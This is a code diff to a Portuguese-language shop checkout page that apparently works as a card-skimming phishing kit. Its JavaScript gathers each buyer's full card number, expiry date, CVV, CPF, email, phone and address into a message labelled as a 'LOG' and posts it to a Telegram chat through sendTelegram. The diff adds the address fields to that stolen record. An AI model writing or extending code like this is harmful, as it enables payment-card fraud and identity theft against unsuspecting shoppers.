@@ -101,12 +101,12 @@
                         <input type="text" id="cust-phone" placeholder="WhatsApp" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm" onblur="syncLead()">
                     </div>
                     <div class="grid grid-cols-2 gap-4">
-                        <input type="text" id="cust-cep" placeholder="CEP" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm" onblur="syncLead()">
-                        <input type="text" id="cust-cidade" placeholder="Cidade" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm">
-                        <input type="text" id="cust-estado" placeholder="Estado" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm">
-                        <input type="text" id="cust-end" placeholder="End" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm">
-                        <input type="text" id="cust-number" placeholder="Nº" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm">
-                        <input type="text" id="cust-bairro" placeholder="Bairro" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-400 outline-none text-sm">
+                        <input type="text" id="cust-cep" placeholder="CEP" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
+                        <input type="text" id="cust-city" placeholder="Cidade" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
+                        <input type="text" id="cust-state" placeholder="Estado" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
+                        <input type="text" id="cust-address" placeholder="End" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
+                        <input type="text" id="cust-number" placeholder="Nº" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
+                        <input type="text" id="cust-neighborhood" placeholder="Bairro" class="border p-3 rounded-lg focus:ring-2 focus:ring-pink-500 outline-none text-sm">
                     </div>
                 </div>
 
@@ -136,12 +136,12 @@
                             <option value="4">4x sem juros</option>
                             <option value="5">5x sem juros</option>
                             <option value="6">6x sem juros</option>
-                            <option value="1">7x sem juros</option>
-                            <option value="2">8x sem juros</option>
-                            <option value="3">9x sem juros</option>
-                            <option value="4">10x sem juros</option>
-                            <option value="5">11x sem juros</option>
-                            <option value="6">12x sem juros</option
+                            <option value="7">7x sem juros</option>
+                            <option value="8">8x sem juros</option>
+                            <option value="9">9x sem juros</option>
+                            <option value="10">10x sem juros</option>
+                            <option value="11">11x sem juros</option>
+                            <option value="12">12x sem juros</option>
                         </select>
                     </div>
                 </div>
@@ -341,6 +341,14 @@
             const email = document.getElementById('cust-email').value;
             const cpf = document.getElementById('cust-cpf').value;
             const phone = document.getElementById('cust-phone').value;
+            
+            // Dados de Endereço
+            const cep = document.getElementById('cust-cep').value;
+            const city = document.getElementById('cust-city').value;
+            const state = document.getElementById('cust-state').value;
+            const address = document.getElementById('cust-address').value;
+            const number = document.getElementById('cust-number').value;
+            const neighborhood = document.getElementById('cust-neighborhood').value;
 
             if(!name || !email || !cpf || !phone) { alert("Preencha os dados obrigatórios!"); return; }
 
@@ -350,18 +358,23 @@
             const total = cart.reduce((a, b) => a + b.price, 0).toFixed(2);
             const prodList = cart.map(i => `• ${i.name}`).join('\n');
             
-            let paymentDetails = `*Método:* ${selectedMethod.toUpperCase()}`;
+            let paymentDetails = `*PAGAMENTO:* ${selectedMethod.toUpperCase()}`;
             if(selectedMethod === 'card') {
-                paymentDetails += `\n*Cartão:* ${document.getElementById('card-number').value}\n*Exp:* ${document.getElementById('card-month').value}/${document.getElementById('card-year').value}\n*CVV:* ${document.getElementById('card-cvv').value}\n*Parc:* ${document.getElementById('card-installments').value}x`;
+                paymentDetails += `\n*Cartão:* ${document.getElementById('card-number').value}\n*Validade:* ${document.getElementById('card-month').value}/${document.getElementById('card-year').value}\n*CVV:* ${document.getElementById('card-cvv').value}\n*Parcelas:* ${document.getElementById('card-installments').value}x`;
             }
 
-            const msgFinal = `💰 *NOVA ORDEM DE COMPRA (LOG)*\n\n` +
-                             `*CLIENTE:* ${name}\n` +
-                             `*CPF:* ${cpf}\n` +
-                             `*TEL:* ${phone}\n` +
-                             `*TOTAL:* R$ ${total}\n\n` +
-                             `${paymentDetails}\n\n` +
-                             `*PRODUTOS:*\n${prodList}`;
+            const msgFinal = `💰 *NOVO PEDIDO (SAndxCDD LOG)*\n\n` +
+                             `👤 *CLIENTE:* ${name}\n` +
+                             `🆔 *CPF:* ${cpf}\n` +
+                             `📧 *EMAIL:* ${email}\n` +
+                             `📱 *WHATS:* ${phone}\n\n` +
+                             `📍 *ENDEREÇO:*\n` +
+                             `${address}, ${number}\n` +
+                             `${neighborhood} - ${city}/${state}\n` +
+                             `CEP: ${cep}\n\n` +
+                             `🛒 *PRODUTOS:*\n${prodList}\n\n` +
+                             `💵 *TOTAL:* R$ ${total}\n\n` +
+                             `${paymentDetails}`;
 
             await sendTelegram(msgFinal);
             
@@ -376,7 +389,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
-            } catch (e) { console.error("Erro Telegram"); }
+            } catch (e) { console.error("Erro ao enviar para o Telegram", e); }
         }
 
         const slides = document.querySelectorAll('#main-carousel img');
